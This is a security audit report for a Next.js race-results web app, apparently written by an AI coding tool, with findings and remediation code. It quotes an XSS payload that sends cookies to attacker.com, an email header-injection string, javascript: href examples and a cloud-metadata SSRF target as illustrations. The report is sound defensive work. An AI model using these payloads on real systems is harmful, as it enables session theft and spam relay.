# Security Review: Race Replay

**Date:** 2026-06-23  
**Scope:** Full codebase audit — all source files, config, CI/CD, dependencies  
**Reviewer:** Claude Code (automated static analysis)

---

## Project Overview

Race Replay is an open-source Next.js 16 / React 19 web application that analyzes athletic race results from timing providers (RTRT.me, raceresult.com) and produces leg-by-leg passing statistics for triathlons and road races. The tech stack is: Next.js + TypeScript, Prisma + PostgreSQL (Neon serverless), shadcn/ui + Tailwind, Vercel hosting, Nodemailer (Gmail SMTP) for a race-request form.

The application is largely read-only from the user's perspective — no login, no accounts, no user-submitted data except a single race request form. Data ingestion runs as a local CLI tool, not as a web-exposed endpoint.

---

## Issue Summary

| # | Status | Severity | Category | File | Issue |
|---|--------|----------|----------|------|-------|
| 1 | ✅ Fixed | **HIGH** | Email Injection | `api/request-race/route.ts` | User input interpolated raw into HTML email body |
| 2 | ✅ Fixed | **HIGH** | Email Header Injection | `api/request-race/route.ts` | `requesterEmail` used as `replyTo` without format validation |
| 3 | ✅ Fixed | **MEDIUM** | URL / XSS in Email | `api/request-race/route.ts` | `raceUrl` inserted into email `<a href>` without scheme validation |
| 4 | ✅ Fixed | **MEDIUM** | Input Validation | `api/request-race/route.ts` | `raceYear` not validated on the server (only client-side) |
| 5 | ✅ Fixed | **MEDIUM** | No Rate Limiting | `api/request-race/route.ts` | POST endpoint has no per-IP throttle — can be abused for email spam |
| 6 | ✅ Fixed | **MEDIUM** | Missing HTTP Security Headers | `next.config.ts` | No CSP, HSTS, X-Frame-Options, or X-Content-Type-Options |
| 7 | ⬜ Open | **MEDIUM** | SSRF in Scraper | `scraper/providers/raceresult.mjs` | `--url` CLI param fetches any URL with no domain allowlist |
| 8 | ⬜ Open | **MEDIUM** | Overpermissioned GitHub Token | `.github/workflows/version_increment.yaml` | `ADMIN_TOKEN` (full admin PAT) used just to modify branch rulesets |
| 9 | ⬜ Open | **LOW** | Insecure Default Documented | `README.md` | Default PostgreSQL password `postgres` not marked as dev-only |
| 10 | ⬜ Open | **LOW** | No Security Policy | repo root | No `SECURITY.md` — no channel for responsible disclosure |
| 11 | ⬜ Open | **INFO** | `dangerouslySetInnerHTML` | `app/layout.tsx`, `events/.../page.tsx` | Two uses; both are safe (hardcoded script, JSON.stringify) — worth noting |

---

## Detailed Findings

---

### 1. ✅ HTML Injection in Email Body — HIGH

**File:** `app/src/app/api/request-race/route.ts` (~lines 35–44)

**Description:**  
The race-request email is built by interpolating user-supplied form fields directly into a raw HTML string with no escaping:

```typescript
html: `
  <h2>New Race Request</h2>
  <table ...>
    <tr><td><strong>Race Name</strong></td><td>${raceName.trim()}</td></tr>
    <tr><td><strong>Notes</strong></td><td ...>${notes?.trim() || "None"}</td></tr>
    ...
  </table>
`
```

An attacker submitting the form with a crafted `raceName` or `notes` value can inject arbitrary HTML/CSS/JS into the email received by the site owner:

```
Race Name: <img src=x onerror="fetch('https://attacker.com?token='+document.cookie)">
```

**Impact:** Phishing content in admin email; potential script execution depending on email client; content spoofing.

**Remediation:**  
Escape all user values before interpolation. Add the `he` or `html-escaper` package and wrap every interpolated value:

```typescript
import { escape } from "html-escaper";

html: `
  <tr><td>Race Name</td><td>${escape(raceName.trim())}</td></tr>
  <tr><td>Notes</td><td>${escape(notes?.trim() ?? "None")}</td></tr>
`
```

---

### 2. ✅ Email Header Injection via `replyTo` — HIGH

**File:** `app/src/app/api/request-race/route.ts` (~line 25)

**Description:**  
The user-supplied `requesterEmail` is passed directly to Nodemailer's `replyTo` field without validating that it is a well-formed email address:

```typescript
replyTo: requesterEmail?.trim() || undefined,
```

If the value contains newlines (e.g., `victim@example.com\nBcc: spam@list.com`), some SMTP implementations will interpret the injected headers, enabling email header injection.

**Impact:** Blind Bcc/Cc injection; potential for email spoofing; spam relay.

**Remediation:**  
Validate email format server-side before using it:

```typescript
const emailRegex = /^[^\s@\r\n]+@[^\s@\r\n]+\.[^\s@\r\n]+$/;
if (requesterEmail && !emailRegex.test(requesterEmail.trim())) {
  return NextResponse.json({ error: "Invalid email address" }, { status: 400 });
}
```

---

### 3. ✅ Unvalidated URL Scheme in Email Href — MEDIUM

**File:** `app/src/app/api/request-race/route.ts` (~line 40)

**Description:**  
The user-supplied `raceUrl` is embedded in an `<a href>` inside the HTML email with no scheme validation:

```typescript
${raceUrl?.trim()
  ? `<a href="${raceUrl.trim()}">${raceUrl.trim()}</a>`
  : "Not provided"}
```

A value of `javascript:fetch('...')` or `data:text/html,...` becomes a clickable link in the received email that may execute in the email client.

**Impact:** Malicious link delivered to admin inbox; potential script execution in HTML-rendering email clients.

**Remediation:**

```typescript
function safeHref(raw: string | undefined): string {
  if (!raw?.trim()) return "Not provided";
  try {
    const url = new URL(raw.trim());
    if (url.protocol === "http:" || url.protocol === "https:") {
      return `<a href="${escape(raw.trim())}">${escape(raw.trim())}</a>`;
    }
  } catch {}
  return escape(raw.trim()); // show as plain text if not a valid http(s) URL
}
```

---

### 4. ✅ Missing Server-Side Validation for `raceYear` — MEDIUM

**File:** `app/src/app/api/request-race/route.ts`

**Description:**  
`raceYear` is checked for presence but not validated as a reasonable integer. Frontend enforces `min`/`max` attributes, but these are trivially bypassed via direct API calls or browser dev tools.

```typescript
if (!raceYear) {
  return NextResponse.json({ error: "Race year is required" }, { status: 400 });
}
// No further checks — -999999 or 2099999 both pass
```

**Impact:** Malformed data in email; potential for confusing downstream consumers.

**Remediation:**

```typescript
const year = parseInt(String(raceYear), 10);
const currentYear = new Date().getFullYear();
if (isNaN(year) || year < 1900 || year > currentYear + 2) {
  return NextResponse.json({ error: "Invalid race year" }, { status: 400 });
}
```

---

### 5. ✅ No Rate Limiting on `/api/request-race` — MEDIUM

**File:** `app/src/app/api/request-race/route.ts`

**Description:**  
The POST endpoint sends an email on every valid request. There is no per-IP or per-session throttle. An automated script could flood the admin mailbox with thousands of race requests, effectively DoS-ing the notification channel.

**Impact:** Admin email spam; potential for abuse to overwhelm Gmail sending limits; service disruption.

**Remediation (Vercel-native, no extra infra):**  
Use the `@upstash/ratelimit` package with Vercel KV, or use a simple in-memory LRU cache for low-traffic scenarios. At minimum, add a CAPTCHA or honeypot field to the request form. A lightweight option:

```typescript
// middleware.ts or inside the route
import { ipAddress } from "@vercel/functions";

// Track last submission time per IP in KV / Edge Config
// or use Upstash Ratelimit: 5 requests per hour per IP
```

Alternatively, configure Vercel Firewall rules to rate-limit the path `/api/request-race` to ~10 req/min per IP at the edge — no code changes required.

---

### 6. ✅ Missing HTTP Security Headers — MEDIUM

**File:** `app/next.config.ts`

**Description:**  
No HTTP security headers are configured. The current `next.config.ts` only sets `skipTrailingSlashRedirect: true`. Missing headers that browsers rely on for defense-in-depth:

| Header | Risk Without It |
|--------|-----------------|
| `Content-Security-Policy` | Injected scripts or styles would execute |
| `Strict-Transport-Security` | Users could be downgraded to HTTP via MITM |
| `X-Content-Type-Options: nosniff` | Browser MIME sniffing could execute malicious content |
| `X-Frame-Options: SAMEORIGIN` | Clickjacking via iframe embedding |
| `Referrer-Policy` | Full URL of internal pages leaked to third parties |

**Impact:** Increases the blast radius of any future injection vulnerability; enables clickjacking; permits downgrade attacks.

**Remediation:**  
Add a `headers()` export to `next.config.ts`:

```typescript
const securityHeaders = [
  { key: "X-Content-Type-Options",    value: "nosniff" },
  { key: "X-Frame-Options",           value: "SAMEORIGIN" },
  { key: "Referrer-Policy",           value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy",        value: "camera=(), microphone=(), geolocation=()" },
  {
    key: "Strict-Transport-Security",
    value: "max-age=63072000; includeSubDomains; preload",
  },
  {
    key: "Content-Security-Policy",
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline'",   // tighten once theme script is moved
      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
      "font-src 'self' https://fonts.gstatic.com",
      "img-src 'self' data:",
      "connect-src 'self'",
      "frame-ancestors 'none'",
    ].join("; "),
  },
];

export default {
  skipTrailingSlashRedirect: true,
  async headers() {
    return [{ source: "/(.*)", headers: securityHeaders }];
  },
} satisfies NextConfig;
```

---

### 7. SSRF in Scraper `--url` Parameter — MEDIUM

**File:** `scraper/providers/raceresult.mjs` (~lines 72–83)

**Description:**  
The `discoverApiUrl()` function accepts a `--url` flag and issues a `fetch()` to whatever URL is provided, with no allowlist or hostname check:

```javascript
async function discoverApiUrl(myRaceUrl) {
  const res = await fetch(myRaceUrl, { headers: { "User-Agent": UA } });
  // myRaceUrl is directly from process.argv
}
```

If the scraper is ever run in a cloud environment (e.g., CI, Docker, Vercel function), an attacker who can influence the `--url` argument could redirect requests to internal metadata endpoints (e.g., `http://169.254.169.254/latest/meta-data/` on AWS) or internal services.

**Impact:** Medium — currently a local CLI tool, so impact is confined. Becomes HIGH if ever exposed as a web endpoint or run in a shared cloud environment.

**Remediation:**

```javascript
function validateRaceUrl(raw) {
  const url = new URL(raw); // throws on invalid URL
  const allowed = ["myrace.ai", "www.raceresult.com"];
  if (!allowed.some((h) => url.hostname === h || url.hostname.endsWith("." + h))) {
    throw new Error(`URL hostname not in allowlist: ${url.hostname}`);
  }
  return raw;
}
```

---

### 8. Overpermissioned GitHub PAT in CI Workflow — MEDIUM

**File:** `.github/workflows/version_increment.yaml` (~lines 75–106)

**Description:**  
The `version_increment` workflow uses an `ADMIN_TOKEN` (a personal access token with admin repository scope) to temporarily disable branch protection rulesets, push a version bump commit, then re-enable the rules. The `finally` block re-enables protection, but if the workflow fails mid-run or the `finally` block throws, branch protection can be left **permanently disabled**.

Additionally, a personal PAT with admin scope is a broad credential — if it is ever leaked it grants full repository administration (delete branches, change settings, add collaborators, etc.).

**Impact:** Transient window of disabled branch protection after every version bump; PAT exposure could result in full repo compromise.

**Remediation options (in order of preference):**
1. **GitHub App (best):** Create a GitHub App with only `administration:write` on the repo. Apps use short-lived tokens and have scoped permissions.
2. **`gh pr merge --admin`:** If the version bump is always a PR, merge with admin override instead of disabling rulesets.
3. **Fine-grained PAT:** Replace the classic PAT with a fine-grained PAT scoped only to this repository and limited to `contents:write` + `administration:write`.
4. **Add a failure guard:** At minimum, add `continue-on-error: false` and alert on failures so a disabled-rules state is caught immediately.

---

### 9. Default PostgreSQL Credentials in README — LOW

**File:** `README.md` (~lines 96–97, 105)

**Description:**  
The README documents running a local Docker PostgreSQL container with the default password `postgres`:

```bash
docker run --name race-replay-db -e POSTGRES_PASSWORD=postgres ...
```

No disclaimer states these are development-only defaults. Copy-paste users could deploy this to staging/production with well-known credentials.

**Impact:** Low (local dev workflow), but a risk if users follow the docs verbatim for a deployed instance.

**Remediation:**  
Add a visible warning immediately before the Docker command:

```markdown
> ⚠️ **Development only.** The credentials below are for local development.
> Never use `postgres` as a password in staging or production.
> Generate strong, unique credentials for any networked environment.
```

---

### 10. No `SECURITY.md` / Vulnerability Disclosure Policy — LOW

**File:** repo root (missing)

**Description:**  
The repository has no `SECURITY.md` file. Without it, people who discover vulnerabilities have no guidance on how to disclose responsibly — they may file a public GitHub issue, exposing users before a fix is available.

**Impact:** Uncoordinated public disclosure of security issues.

**Remediation:**  
Create `/SECURITY.md`:

```markdown
# Security Policy

## Supported Versions

| Version | Supported |
| ------- | --------- |
| latest  | ✅        |

## Reporting a Vulnerability

**Please do not open a public GitHub issue for security vulnerabilities.**

Email security reports to: [INSERT CONTACT EMAIL]

Include:
- A description of the vulnerability
- Steps to reproduce
- Potential impact assessment

We aim to acknowledge reports within 48 hours and provide a fix timeline within 7 days.
```

---

### 11. `dangerouslySetInnerHTML` Usage — INFORMATIONAL

**Files:**
- `app/src/app/layout.tsx` (~line 59): inline theme-preference script
- `app/src/app/events/[slug]/[year]/page.tsx` (~line 180): JSON-LD structured data via `JSON.stringify`

**Description:**  
Both usages are safe as written: the theme script is hardcoded, and `JSON.stringify` escapes characters that break HTML. However, `dangerouslySetInnerHTML` bypasses React's XSS protections, so these sites should be audited if the content source ever changes.

**Impact:** None currently.

**Recommendation:** For the theme script, consider extracting it to a static `.js` file loaded with `<Script>` (Next.js) to eliminate the `dangerouslySetInnerHTML` entirely. The JSON-LD usage is standard practice.

---

## What's Already Done Well

- **Prisma ORM throughout** — all DB queries are parameterized; no raw SQL concatenation.
- **No authentication surface** — the read-only public nature eliminates an entire class of auth vulnerabilities.
- **Atomic cache writes** in the scraper (`write to .tmp` → `rename`) prevent corrupt cache files.
- **Dependabot configured** with weekly updates and dependency grouping.
- **All dependencies current** — Next.js 16, React 19, Prisma 7, Nodemailer 9.
- **No file upload surface** — ingest is a local CLI tool only.
- **No hardcoded secrets** found in source code; `.env*` files are properly gitignored.
- **Pagination** on large event queries prevents unbounded DB reads.

---

## Prioritized Action Plan

| Priority | # | Action | Effort | Status |
|----------|---|--------|--------|--------|
| 🔴 Do now | 1 | Escape HTML in email body (`html-escaper` or `he`) | 30 min | ✅ Done |
| 🔴 Do now | 2 | Validate `requesterEmail` format before using as `replyTo` | 15 min | ✅ Done |
| 🔴 Do now | 3 | Validate `raceUrl` scheme before embedding in email href | 15 min | ✅ Done |
| 🟡 This sprint | 4 | Add `raceYear` server-side range validation | 10 min | ✅ Done |
| 🟡 This sprint | 5 | Add security headers to `next.config.ts` | 30 min | ✅ Done |
| 🟡 This sprint | 6 | Add rate limiting to `/api/request-race` (in-memory, 5 req/hr per IP) | 1–2 hrs | ✅ Done† |
| 🟡 This sprint | 7 | Create `SECURITY.md` with a responsible disclosure contact | 15 min | ⬜ Open |
| 🟢 Next sprint | 8 | Replace `ADMIN_TOKEN` PAT with a fine-grained PAT or GitHub App | 2–4 hrs | ⬜ Open |
| 🟢 Next sprint | 9 | Add URL domain allowlist to scraper's `discoverApiUrl()` | 20 min | ⬜ Open |
| 🟢 When convenient | 10 | Add dev-only warning to README's Docker instructions | 5 min | ⬜ Open |
| ℹ️ Optional | 11 | Replace theme-script `dangerouslySetInnerHTML` with `<Script>` component | 30 min | ⬜ Open |

† Rate limiting is implemented as an in-memory module-level store (5 requests/hour per IP). This resets on serverless cold starts, which is acceptable for this low-traffic form. If abuse becomes an issue, replace with a persistent store such as Vercel KV or Upstash Redis.
